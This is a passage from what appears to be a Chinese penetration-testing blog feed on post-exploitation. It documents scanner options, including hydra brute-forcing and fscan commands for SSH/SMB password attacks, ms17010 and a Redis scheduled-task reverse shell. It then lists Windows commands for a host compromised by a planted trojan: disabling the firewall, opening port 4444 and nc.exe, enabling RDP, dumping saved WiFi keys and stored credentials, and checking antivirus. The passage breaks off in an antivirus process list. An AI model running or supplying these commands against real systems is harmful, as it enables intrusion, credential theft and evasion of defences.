网段探测模式，此模式下将自动探测主机可达的内网网段可接收参数为：<br>                  <span class="hljs-params">(空)</span>、192、10、172、all、指定IP地址<span class="hljs-params">(将探测该IP地址B段存活网关)</span><br>  <span class="hljs-params">--check</span>         针对目标地址做指纹识别，仅不会进行端口探测<br>  <span class="hljs-params">--scan</span>          将针对<span class="hljs-params">--fofa</span>、<span class="hljs-params">--spy</span>提供的目标对象，进行端口扫描和指纹识别<br>  -p , <span class="hljs-params">--port</span>     扫描指定端口，默认会扫描TOP400，支持：80,8080,8088-8090<br>  -eP, <span class="hljs-params">--excluded-port</span> 跳过扫描指定的端口，支持：80,8080,8088-8090<br>  -o , <span class="hljs-params">--output</span>   将扫描结果保存到文件<br>  -oJ             将扫描结果使用json格式保存到文件<br>  -Pn          使用此参数后，将不会进行智能存活性探测，现在默认会开启智能存活性探测，提高效率<br>  -Cn             使用此参数后，控制台输出结果将不会带颜色<br>  -Dn             使用此参数后，将关闭CDN识别功能<br>  -sV             使用此参数后，将对所有端口进行全探针探测，此参数极度影响效率，慎用！<br>  <span class="hljs-params">--top</span>           扫描经过筛选处理的常见端口TopX，最高支持1000个，默认为TOP400<br>  <span class="hljs-params">--proxy</span>         设置代理<span class="hljs-params">(socks5|socks4|https|http)</span>:<span class="hljs-string">//IP</span><span class="hljs-function">:Port</span><br>  <span class="hljs-params">--threads</span>       线程参数,默认线程100,最大值为2048<br>  <span class="hljs-params">--path</span>          指定请求访问的目录，只支持单个目录<br>  <span class="hljs-params">--host</span>          指定所有请求的头部Host值<br>  <span class="hljs-params">--timeout</span>       设置超时时间<br>  <span class="hljs-params">--encoding</span>      设置终端输出编码，可指定为：gb2312、utf-8<br>  <span class="hljs-params">--match</span>         对资产返回banner进行检索，存在关键字的，才会显示，否则不会显示<br>  <span class="hljs-params">--hydra</span>         自动化爆破支持协议：ssh,rdp,ftp,smb,mysql,mssql,oracle,postgresql,mongodb,redis,默认会开启全部<br>hydra options:<br>   <span class="hljs-params">--hydra-user</span>   自定义hydra爆破用户名<span class="hljs-function">:username</span> or user1,user2 or file<span class="hljs-function">:username.txt</span><br>   <span class="hljs-params">--hydra-pass</span>   自定义hydra爆破密码<span class="hljs-function">:password</span> or pass1,pass2 or file<span class="hljs-function">:password.txt</span><br>                  若密码中存在使用逗号的情况，则使用\,进行转义，其他符号无需转义<br>   <span class="hljs-params">--hydra-update</span> 自定义用户名、密码模式，若携带此参数，则为新增模式，会将用户名和密码补充在默认字典后面。否则将替换默认字典。<br>   <span class="hljs-params">--hydra-mod</span>    指定自动化暴力破解模块<span class="hljs-function">:rdp</span> or rdp,ssh,smb<br>fofa options:<br>   <span class="hljs-params">--fofa-syntax</span>  将获取fofa搜索语法说明<br>   <span class="hljs-params">--fofa-size</span>    将设置fofa返回条目数，默认100条<br>   <span class="hljs-params">--fofa-fix-keyword</span> 修饰keyword，该参数中的&#123;&#125;最终会替换成-f参数的值<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231006172801048.png" alt="image-20231006172801048"></p><h3 id="fscan-1"><a href="#fscan-1" class="headerlink" title="fscan"></a>fscan</h3><p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、 web漏洞扫描、netbios探测、域控识别等功能。</p><p><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -rf id_rsa.pub (redis 写公钥)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -rs <span class="hljs-number">192.168.1.1:6666</span> (redis 计划任务反弹shell)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -c whoami (ssh 爆破成功后，命令执行)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -m ssh -p <span class="hljs-number">2222</span> (指定模块ssh和端口)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -pwdf pwd.txt -userf users.txt (加载指定文件的用户名密码来进行爆破)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -o /tmp/<span class="hljs-number">1</span>.txt (指定扫描结果保存路径,默认保存在当前路径)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">8</span> (A段的<span class="hljs-number">192</span>.x.x.<span class="hljs-number">1</span>和<span class="hljs-number">192</span>.x.x.<span class="hljs-number">254</span>,方便快速查看网段信息 )<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -m smb -pwd password (smb密码碰撞)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -m ms17010 (指定模块)<br><span class="hljs-attribute">fscan</span>.exe -hf ip.txt (以文件导入)<br><span class="hljs-attribute">fscan</span>.exe -u http://baidu.com -proxy <span class="hljs-number">8080</span> (扫描单个url,并设置http代理 http://<span class="hljs-number">127.0.0.1:8080</span>)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231006172812623.png" alt="image-20231006172812623"></p><h3 id="常见端口服务"><a href="#常见端口服务" class="headerlink" title="常见端口服务"></a>常见端口服务</h3><p>文件共享服务端口</p><p><img src="/img/image-20231006165630316.png" alt="image-20231006165630316"></p><p>远程连接端口服务</p><p><img src="/img/image-20231006165647620.png" alt="image-20231006165647620"></p><p>web应用服务端口</p><p><img src="/img/image-20231006165708195.png" alt="image-20231006165708195"></p><p>数据库服务端口</p><p><img src="/img/image-20231006171543658.png" alt="image-20231006171543658"></p><p>邮件服务端口</p><p><img src="/img/image-20231006171559951.png" alt="image-20231006171559951"></p><p>网络常见协议端口</p><p><img src="/img/image-20231006171618711.png" alt="image-20231006171618711"></p><p>特殊服务端口</p><p><img src="/img/image-20231006171641923.png" alt="image-20231006171641923"></p>]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网信息搜集1-搜集靶机信息</title>
    <link href="/2023/10/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-%E6%90%9C%E9%9B%86%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF/"/>
    <url>/2023/10/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-%E6%90%9C%E9%9B%86%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="1-利用CS收集靶机信息"><a href="#1-利用CS收集靶机信息" class="headerlink" title="1.利用CS收集靶机信息"></a>1.利用CS收集靶机信息</h2><p>场景例：制作木马，目标上线 </p><img src="/img/image-20231005212215868.png" alt="image-20231005212215868" style="zoom:67%;" /><h3 id="网络配置信息"><a href="#网络配置信息" class="headerlink" title="网络配置信息"></a>网络配置信息</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231005212618341.png" alt="image-20231005212618341" style="zoom: 50%;" /><h3 id="操作系统和版本信息"><a href="#操作系统和版本信息" class="headerlink" title="操作系统和版本信息"></a>操作系统和版本信息</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">systeminfo<br>systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Name&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Version&quot;</span><br>systeminfo| findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 名称&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 版本&quot;</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231005213109711.png" alt="image-20231005213109711" style="zoom:67%;" /><h3 id="查看操作系统位数"><a href="#查看操作系统位数" class="headerlink" title="查看操作系统位数"></a>查看操作系统位数</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">echo</span> <span class="hljs-variable">%PROCESSOR_ARCHITECTURE%</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231005213359843.png" alt="image-20231005213359843" style="zoom:67%;" /><h3 id="查看安装的软件及版本"><a href="#查看安装的软件及版本" class="headerlink" title="查看安装的软件及版本"></a>查看安装的软件及版本</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic product <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-keyword">version</span><br>powershell &quot;Get‐WmiObject ‐class win32_product | Select‐Object ‐Property name,version&quot;<br></code></pre></td></tr></table></figure><h3 id="查看本机服务信息"><a href="#查看本机服务信息" class="headerlink" title="查看本机服务信息"></a>查看本机服务信息</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wmic service list brief</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231005213844372.png" alt="image-20231005213844372" style="zoom: 50%;" /><h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">tasklist<br>wmic process list brief<br></code></pre></td></tr></table></figure><img src="/img/image-20231005214106602.png" alt="image-20231005214106602" style="zoom: 50%;" /><h3 id="开机启动程序信息"><a href="#开机启动程序信息" class="headerlink" title="开机启动程序信息"></a>开机启动程序信息</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">wmic startup <span class="hljs-built_in">get</span> <span class="hljs-keyword">command</span>,<span class="hljs-title">caption</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231005214240056.png" alt="image-20231005214240056" style="zoom: 67%;" /><h3 id="计划任务信息"><a href="#计划任务信息" class="headerlink" title="计划任务信息"></a>计划任务信息</h3><p>如果出现无法加载列资源 输入：chcp 437</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><h3 id="主机开机时间"><a href="#主机开机时间" class="headerlink" title="主机开机时间"></a>主机开机时间</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> statistics workstation<br></code></pre></td></tr></table></figure><img src="/img/image-20231005214826473.png" alt="image-20231005214826473" style="zoom: 67%;" /><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span><br><span class="hljs-title">wmic</span> useraccount get name,SID<br></code></pre></td></tr></table></figure><img src="/img/image-20231005214936466.png" alt="image-20231005214936466" style="zoom:67%;" /><img src="/img/image-20231005215123564.png" alt="image-20231005215123564" style="zoom:67%;" /><h3 id="列出会话"><a href="#列出会话" class="headerlink" title="列出会话"></a>列出会话</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> session<br></code></pre></td></tr></table></figure><h3 id="查看端口列表"><a href="#查看端口列表" class="headerlink" title="查看端口列表"></a>查看端口列表</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">netstat</span> ‐ano<br></code></pre></td></tr></table></figure><img src="/img/image-20231005215356131.png" alt="image-20231005215356131" style="zoom:67%;" /><h3 id="查看补丁列表"><a href="#查看补丁列表" class="headerlink" title="查看补丁列表"></a>查看补丁列表</h3><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>info<br>wmic qfe get <span class="hljs-keyword">Caption</span>,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure><img src="/img/image-20231005215541118.png" alt="image-20231005215541118" style="zoom:67%;" /><h3 id="查询共享列表"><a href="#查询共享列表" class="headerlink" title="查询共享列表"></a>查询共享列表</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">share</span><br>wmic <span class="hljs-keyword">share</span> <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-type">path</span>,status<br></code></pre></td></tr></table></figure><img src="/img/image-20231005215623845.png" alt="image-20231005215623845" style="zoom: 67%;" /><h3 id="路由信息查询"><a href="#路由信息查询" class="headerlink" title="路由信息查询"></a>路由信息查询</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">route print<br></code></pre></td></tr></table></figure><img src="/img/image-20231005215740037.png" alt="image-20231005215740037" style="zoom: 50%;" /><h3 id="防火墙相关操作"><a href="#防火墙相关操作" class="headerlink" title="防火墙相关操作"></a>防火墙相关操作</h3><h4 id="1-查看防火墙是否开启"><a href="#1-查看防火墙是否开启" class="headerlink" title="1.查看防火墙是否开启"></a>1.查看防火墙是否开启</h4><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh firewall show <span class="hljs-keyword">state</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231005220507853.png" alt="image-20231005220507853" style="zoom:50%;" /><h4 id="2-关闭防火墙"><a href="#2-关闭防火墙" class="headerlink" title="2.关闭防火墙"></a>2.关闭防火墙</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Windows<span class="hljs-built_in"> server </span>2003: netsh<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">set</span> opmode <span class="hljs-built_in">disable</span><br>Windows<span class="hljs-built_in"> server </span>2003之后: netsh<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">set</span> opmode <span class="hljs-built_in">disable</span> 或者netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off  （全关 推荐）<br></code></pre></td></tr></table></figure><img src="/img/image-20231005221444262.png" alt="image-20231005221444262" style="zoom:50%;" /><h4 id="3-查看防火墙配置"><a href="#3-查看防火墙配置" class="headerlink" title="3.查看防火墙配置"></a>3.查看防火墙配置</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">netsh firewall <span class="hljs-keyword">show </span><span class="hljs-built_in">config</span><br></code></pre></td></tr></table></figure><h4 id="4-修改防火墙配置"><a href="#4-修改防火墙配置" class="headerlink" title="4.修改防火墙配置"></a>4.修改防火墙配置</h4><p>2003及之前的版本,允许指定的程序进行全部的连接：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> allowedprogram c:\nc.exe <span class="hljs-string">&quot;allownc&quot;</span> enable<br></code></pre></td></tr></table></figure><p>2003之后的版本，允许指定的程序进行全部的连接：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;pass nc&quot;</span>dir=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;C:\nc.exe&quot;</span><br></code></pre></td></tr></table></figure><p>允许指定程序退出,命令如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Allownc&quot;</span> <span class="hljs-attribute">dir</span>=out <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;C: \nc.exe&quot;</span><br></code></pre></td></tr></table></figure><p>允许3389端口放行,命令如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;RemoteDesktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=test <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=4444  #允许4444端口进站<br><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=test <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=c:\a.exe  #允许a.exe进站<br><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=test <span class="hljs-attribute">dir</span>=out <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=4444  #允许4444端口出站 <br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=test <span class="hljs-attribute">dir</span>=out <span class="hljs-attribute">action</span>=allow<br><span class="hljs-attribute">program</span>=c:\a.exe  #允许a.exe出站<br></code></pre></td></tr></table></figure><h3 id="开启远程服务"><a href="#开启远程服务" class="headerlink" title="开启远程服务"></a>开启远程服务</h3><p>1.在2003机器上</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic <span class="hljs-type">path</span> win32_terminalservicesetting <span class="hljs-keyword">where</span> (_CLASS !=&quot;&quot;) <span class="hljs-keyword">call</span> setallowtsconnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>2.在server2008和server 2021</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f <span class="hljs-comment">#开启</span></span><br><br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 11111111 /f <span class="hljs-comment">#关闭</span></span><br></code></pre></td></tr></table></figure><h3 id="wifi密码收集"><a href="#wifi密码收集" class="headerlink" title="wifi密码收集"></a>wifi密码收集</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">for</span> /f <span class="hljs-string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;netsh wlan show profiles&#x27;</span>) <span class="hljs-keyword">do</span> @echo %j | findstr ‐i ‐v echo | netsh wlan show profiles %j key=<span class="hljs-keyword">clear</span><br></code></pre></td></tr></table></figure><h3 id="查询RDP端口"><a href="#查询RDP端口" class="headerlink" title="查询RDP端口"></a>查询RDP端口</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP‐Tcp&quot;</span> /V PortNumber<br></code></pre></td></tr></table></figure><p>结果中的0xd3d即为3389端口</p><h3 id="查询代理配置信息"><a href="#查询代理配置信息" class="headerlink" title="查询代理配置信息"></a>查询代理配置信息</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231005222323642.png" alt="image-20231005222323642" style="zoom: 50%;" /><h3 id="查询当前保存的登录凭证"><a href="#查询当前保存的登录凭证" class="headerlink" title="查询当前保存的登录凭证"></a>查询当前保存的登录凭证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmdkey /l<br></code></pre></td></tr></table></figure><h3 id="ARP信息"><a href="#ARP信息" class="headerlink" title="ARP信息"></a>ARP信息</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">arp ‐<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><h3 id="查看最近打开的文档"><a href="#查看最近打开的文档" class="headerlink" title="查看最近打开的文档"></a>查看最近打开的文档</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">dir</span> <span class="hljs-variable">%APPDATA%</span>\Microsoft\Windows\Recent<br></code></pre></td></tr></table></figure><img src="/img/image-20231005223331453.png" alt="image-20231005223331453" style="zoom:50%;" /><h3 id="查询本地用户组"><a href="#查询本地用户组" class="headerlink" title="查询本地用户组"></a>查询本地用户组</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup<br></code></pre></td></tr></table></figure><img src="/img/image-20231005222523578.png" alt="image-20231005222523578" style="zoom:67%;" /><h3 id="管理员组成员列表"><a href="#管理员组成员列表" class="headerlink" title="管理员组成员列表"></a>管理员组成员列表</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup administrators<br></code></pre></td></tr></table></figure><h3 id="RDP凭证"><a href="#RDP凭证" class="headerlink" title="RDP凭证"></a>RDP凭证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /a %userprofile%\AppData\Local\Microsoft\Credentials\*<br></code></pre></td></tr></table></figure><h3 id="杀毒软件查询"><a href="#杀毒软件查询" class="headerlink" title="杀毒软件查询"></a>杀毒软件查询</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">wmic /node:localhost /<span class="hljs-keyword">namespace</span>:\\<span class="hljs-symbol">root</span>\<span class="hljs-symbol">securitycenter2</span> <span class="hljs-symbol">path</span> <span class="hljs-symbol">antivirusproduct</span> <span class="hljs-symbol">get</span> <span class="hljs-symbol">displayname</span> /<span class="hljs-symbol">format</span>:<span class="hljs-symbol">list</span><br></code></pre></td></tr></table></figure><p>常见杀毒软件进程：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span 